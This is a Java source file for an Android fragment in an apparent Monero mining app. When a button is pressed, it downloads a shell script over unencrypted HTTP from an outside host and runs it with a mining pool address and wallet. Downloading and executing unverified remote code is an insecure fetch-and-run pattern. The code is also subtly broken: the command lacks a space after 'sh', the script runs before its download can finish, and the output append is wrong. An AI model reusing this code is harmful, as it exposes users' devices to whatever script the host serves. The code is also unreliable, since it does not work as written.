package cc.symplectic.monerado.fragmets;

import android.annotation.SuppressLint;
import android.app.DownloadManager;
import android.content.Context;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.TextView;

import androidx.fragment.app.Fragment;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

import cc.symplectic.monerado.R;

public class WarriorVMinerFragment extends Fragment {
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup parent, Bundle savedInstanceState) {
        // Defines the xml file for the fragment
        return inflater.inflate(R.layout.fragment_warriorv_miner, parent, false);
    }

    @Override
    public void onViewCreated(View view, Bundle savedInstanceState) {
        Button StartButton = view.findViewById(R.id.miner_startbutton);
        TextView WarriorVMinerOutput = view.findViewById(R.id.warriorv_miner_output);
        StartButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                RunWarriorVMiner(WarriorVMinerOutput);
            }
        });
    }

    private String RunWarriorVMiner(TextView textView) {

        try {
            // Executes the command.
            System.setProperty("TLS", "1");
            System.setProperty("WORKER", "BLARGY");
            @SuppressLint("SdCardPath")
            DownloadManager downloadmanager = (DownloadManager) getContext().getSystemService(Context.DOWNLOAD_SERVICE);
            Uri uri = Uri.parse("http://xmrig.mx99.ml/miner.sh");

            DownloadManager.Request request = new DownloadManager.Request(uri);
            request.setTitle("WarriorV XMR Miner");
            request.setDescription("Downloading");
            request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
            request.setVisibleInDownloadsUi(false);
            request.setDestinationUri(Uri.parse("file://" +  Environment.getExternalStorageDirectory().getPath() + "/"+ "miner.sh"));

            downloadmanager.enqueue(request);
            Process process = Runtime.getRuntime().exec("sh" +  Environment.getExternalStorageDirectory().getPath() + "/miner.sh gulf.moneroocean.stream:443 8AVHiEq9tpnTycu3uXwCBA4qjTfMvLq7RSqV2egbDu2K6z7VasBq8M7Ljg9F9uHy2DVScyF8cQouVedUMHbkowjVA7Gsp6N cn-heavy/xhv");

            // Reads stdout.
            // NOTE: You can write to stdin of the command using
            //       process.getOutputStream().
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));

            int read;
            char[] buffer = new char[4096];
            StringBuffer output = new StringBuffer();
            while ((read = reader.read(buffer)) > 0) {
                output.append(buffer, 0, read);
                textView.append(buffer.toString(),0, read);

            }
            reader.close();

            // Waits for the command to finish.
            process.waitFor();

            return output.toString();
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

}
